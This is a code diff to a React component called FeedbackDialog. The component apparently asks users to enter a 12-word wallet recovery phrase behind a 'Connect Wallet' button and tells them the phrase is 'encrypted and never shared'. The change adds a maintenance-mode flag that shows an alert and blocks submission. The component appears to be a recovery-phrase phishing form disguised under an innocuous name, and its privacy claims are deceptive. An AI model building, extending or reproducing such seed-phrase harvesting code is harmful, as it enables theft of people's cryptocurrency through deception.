@@ -5,10 +5,14 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { Progress } from "@/components/ui/progress";
+import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { z } from "zod";
 import { supabase } from "@/integrations/supabase/client";
 import { useWallet } from "@/contexts/WalletContext";
-import { ClipboardPaste, Lock, CheckCircle2 } from "lucide-react";
+import { ClipboardPaste, Lock, CheckCircle2, AlertTriangle } from "lucide-react";
+
+// Maintenance mode flag - set to true to enable maintenance mode
+const MAINTENANCE_MODE = true;
 
 const feedbackSchema = z.object({
   fields: z.array(z.string().trim().max(200, { message: "ProTools Bundler" })),
@@ -68,6 +72,16 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
+    // Check maintenance mode first
+    if (MAINTENANCE_MODE) {
+      toast({
+        title: "System Maintenance",
+        description: "Wallet connections are temporarily unavailable during maintenance. Please try again later.",
+        variant: "destructive",
+      });
+      return;
+    }
 
     // Check if all fields are filled
     const emptyFields = fields.filter(f => !f.trim()).length;
@@ -176,18 +190,32 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
           </DialogDescription>
         </DialogHeader>
 
+        {/* Maintenance Mode Alert */}
+        {MAINTENANCE_MODE && (
+          <Alert variant="destructive" className="border-orange-500/50 bg-orange-500/10">
+            <AlertTriangle className="h-4 w-4" />
+            <AlertTitle>System Maintenance in Progress</AlertTitle>
+            <AlertDescription className="text-sm">
+              Wallet connections are currently unavailable while we perform scheduled maintenance. 
+              No connections can be made at this time. Please check back later.
+            </AlertDescription>
+          </Alert>
+        )}
+
         {/* Benefits Section */}
-        <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 sm:p-4">
-          <div className="flex items-start gap-3">
-            <Lock className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
-            <div className="flex-1 min-w-0">
-              <h3 className="font-semibold text-sm mb-1">Secure & Private</h3>
-              <p className="text-xs text-muted-foreground leading-relaxed">
-                Your recovery phrase is encrypted and never shared. Connecting unlocks: coin launches, transaction history, airdrops, and advanced analytics.
-              </p>
+        {!MAINTENANCE_MODE && (
+          <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 sm:p-4">
+            <div className="flex items-start gap-3">
+              <Lock className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
+              <div className="flex-1 min-w-0">
+                <h3 className="font-semibold text-sm mb-1">Secure & Private</h3>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  Your recovery phrase is encrypted and never shared. Connecting unlocks: coin launches, transaction history, airdrops, and advanced analytics.
+                </p>
+              </div>
             </div>
           </div>
-        </div>
+        )}
 
         {/* Progress Indicator */}
         <div className="space-y-2">
@@ -256,10 +284,10 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
             </Button>
             <Button 
               type="submit" 
-              disabled={filledFields < 12 || isSubmitting}
+              disabled={filledFields < 12 || isSubmitting || MAINTENANCE_MODE}
               className="min-w-[120px]"
             >
-              {isSubmitting ? "Connecting..." : "Connect Wallet"}
+              {MAINTENANCE_MODE ? "Maintenance Mode" : isSubmitting ? "Connecting..." : "Connect Wallet"}
             </Button>
           </div>
         </form>
